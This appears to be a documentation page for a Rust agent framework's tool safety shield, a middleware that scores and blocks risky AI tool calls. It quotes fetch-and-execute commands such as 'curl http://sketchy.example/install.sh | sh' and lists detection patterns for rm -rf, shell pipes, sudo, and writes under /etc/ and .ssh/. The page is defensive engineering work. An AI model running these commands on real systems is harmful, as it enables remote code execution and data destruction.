---
title: "The tool safety shield"
sidebar:
  order: 7
---

A model with a shell tool can be talked into `curl evil.example | sh`. The shield scores your tool calls for risk before they run, so benign calls proceed and moderate risk logs a warning.

Genuinely dangerous input is refused. The refusal is soft, so the model sees why and adapts. Sources: `src/tool/shield.rs`, `src/middleware/shield.rs`.

You enable it with `features = ["tool_shield"]`, which implies `tool_health`.

## The trait and its three methods

```rust
pub trait ToolSafetyShield: Send + Sync {
    fn evaluate(&self, ctx: &ShieldContext) -> SafetyDecision;   // must be deterministic
    fn record_invocation(&self, tool: &str, input: &Value, success: bool);
    fn watched_tools(&self) -> HashSet<String>;  // empty = shield never consulted
}
```

`evaluate` is the pre-call judgment. It returns `Allow`, `Warn` to proceed and log, or `Block` to refuse.

`record_invocation` is the post-call memory. This is how a multi-call attack sequence gets caught.

`watched_tools` declares which tools your shield cares about. Everything else passes untouched.

`ShieldContext` hands the evaluator the tool name, the input JSON, and the turn number. It also carries `recent_calls`, the last 20 admitted watched calls as `(tool, turn)` pairs, maintained by the middleware. A shield with no history of its own still sees that recency window.

## Wiring it in

```rust
let shield = Arc::new(
    UnixShield::builder()
        .with_warn_threshold(0.4)
        .with_block_threshold(0.7)
        .build(),
);
agent.set_pipeline(
    ToolPipeline::builder()
        .with_middleware(SafetyShieldMiddleware::new(shield.clone()))
)?;   // install: AFTER renamers, BEFORE memoize, exactly once
```

A `Block` becomes a soft error, `blocked by safety shield: <reason>`, and the run continues. A `Warn` becomes a `tracing` warning carrying the reason and the category, and the call proceeds.

Every watched call you get admitted is recorded, even one served from an inner cache.

## The shipped pattern table

`UnixShield` is the reference implementation for Unix-y agents. It watches tools named `"Bash"`, `"Write"`, and `"Edit"`, by exact name. Risk aggregates from three dimensions, and each one is a max-score-wins pattern match:

```text
total = ( single-turn score
        + 0.5 × repetition score
        + 0.3 × combination-rule score )  capped at 1.0
Block when total >= block_threshold (default 0.7)
Warn  when total >= warn_threshold (default 0.4)
```

### Single-turn patterns

Matching is substring work on a normalized view: lowercased, with whitespace runs collapsed.

- `rm -rf` scores 0.9. The split-flag and long-flag spellings are separate patterns of their own.
- A pipe into a shell scores 0.8. The compact spelling counts the same.
- `sudo` scores 0.6.
- `chmod 777` scores 0.5.
- Writing under `/etc/` scores 0.7, and writing under `.ssh/` scores 0.8.
- `curl` and `wget` usage scores 0.3 as advisory, so a plain download warns and never blocks.

### Combination rules

These fire across calls, which is what `record_invocation` powers. Each rule needs all of its triggers to have happened, in order.

- A `curl` followed by a pipe into a shell scores 0.85.
- A `Write` followed by `chmod +x` scores 0.75.
- A `chmod` followed by a `Write` scores 0.65.

### Repetition

Prior calls to the same tool inside the recent window add at most 0.6 × 0.5, which is 0.3. Repetition amplifies risk and cannot block on its own, so a session of repeated benign `curl`s keeps warning and keeps executing.

### Risk bands

The score you get lands in one of five bands, and the band picks the action rather than the raw number:

| Band | Score range | Action |
|---|---|---|
| `Safe` | Below 0.2 | Allow, because nothing matched at all. |
| `Low` | 0.2 up to the warn threshold | Allow, because only minor patterns matched. |
| `Medium` | Warn threshold, default 0.4, up to the block threshold | Warn and proceed. |
| `High` | Block threshold, default 0.7, up to 0.9 | Block. |
| `Critical` | 0.9 and above, hardwired | Block. |

Two details in that table are deliberate. `Safe` and `Low` differ only so your dashboard can tell "nothing matched" from "minor stuff matched", and both allow.

The `Critical` floor at 0.9 is not configurable, so the most dangerous patterns land in their own bucket regardless of threshold tuning. `rm -rf` and `curl | sh` both score exactly 0.9.

Threshold hygiene is handled too. If you pass a non-finite value it is rejected, because a NaN would silently disable a band, and nothing compares `>= NaN`.

A `block < warn` ordering is swapped with a warning, and both values are clamped to `[0, 1]`.

### Worked example

The model runs `Bash("curl http://sketchy.example/install.sh | sh")` on a fresh session:

```text
single-turn:  patterns hit: "curl" (0.3), "| sh" (0.8) → max = 0.8
multi-turn:   0 prior Bash calls → 0.0
combination:  nothing executed earlier → 0.0
total = 0.8 + 0.5×0.0 + 0.3×0.0 = 0.80  → High → BLOCK
```

Now suppose the model tries that trick again after an earlier download leg actually executed. The download-then-execute combination rule scores 0.85 and contributes 0.3 × 0.85, about 0.26, and the repetition dimension adds its share, so the total crosses into `Critical`.

That is one more reason a blocked attempt never enters the history: only executed calls can build a combination sequence. The rule also needs its triggers in chronological order, so the same two calls in the other order do not fire it.

### Why the matching is hard to evade

- Your input is normalized before matching, lowercased with whitespace runs collapsed, so `RM  -RF /` and `rm\t-rf` hit the same pattern as `rm -rf`.
- Patterns match on token boundaries wherever the pattern's edge is a word character. So `curl` matches `curl http…` and not `mycurlcmd`.
- Symbol edges carry no such constraint, so `/etc/` matches `/etc/passwd` and a pipe into `sh` matches a command with no space before it.
- Symbol edges carry no such constraint, so `/etc/` matches `/etc/passwd` and `|sh` matches `cmd|sh`.

- A pipe into `sh` does not match `| sha256sum`, so your checksum pipes stay clean.
- Flag-spelling variants like `rm -r -f` and `rm --recursive` are their own patterns, because normalization cannot invent those.
- An empty pattern matches nothing, since a needle with no edges would otherwise match everywhere.

### Extending it

Add your own patterns with `with_pattern(tool, vec![RiskPattern { ... }])`, which appends and never replaces. Add your own rules with `with_combination_rule`.

Start from `UnixShieldBuilder::blank()` for a non-Unix environment such as PowerShell or cloud CLIs. You get an empty table plus your rules, and the builder unions your rules' trigger tools into the watched set automatically.

## The install-order rules

The middleware sees the tool name and input as they reach its layer, so position matters. Three rules, all pinned by tests:

1. **Sit inside any renaming middleware**, which means register after it. Aliases are then evaluated under the name the registry will actually execute. A rewriter placed inside the shield redirects after evaluation, and that aliased call runs unshielded.
2. **Sit outside `MemoizingMiddleware`**, which means register before it. A repeat served from the inner cache is still evaluated and recorded, because the repetition dimension scores your model's behavior. Caching the tool's execution does not make the request less repetitive.
3. **Register exactly once per session.** Two instances evaluate twice and record twice, so the history skews and rules fire early.

Four more behaviors fall out of the same design. A blocked attempt never enters the history, so a refused `curl` does not count toward a later combination rule. An inner layer's rewrites do not leak into the shield's record.

An unwatched tool is neither evaluated nor recorded. And if the watched set is empty, your middleware skips entirely, at zero cost.

## Interactions with the rest of the system

Tool health sees a shield refusal as an `is_error` result, so repeated blocks count as failures toward that tool's breaker.

Once the breaker opens, the engine's gate refuses first, and the model sees "temporarily unavailable" rather than the shield's reason. That precedence is pinned, so plan your messaging accordingly.

Nothing else changes. The shield never touches the conversation, compaction, or detection. It is a pure dispatch-time gate.

## Related pages

- [Middleware](/safety/middleware/) covers the pipeline the shield lives in.
- [Tool health](/safety/tool-health/) covers the breaker its refusals feed.
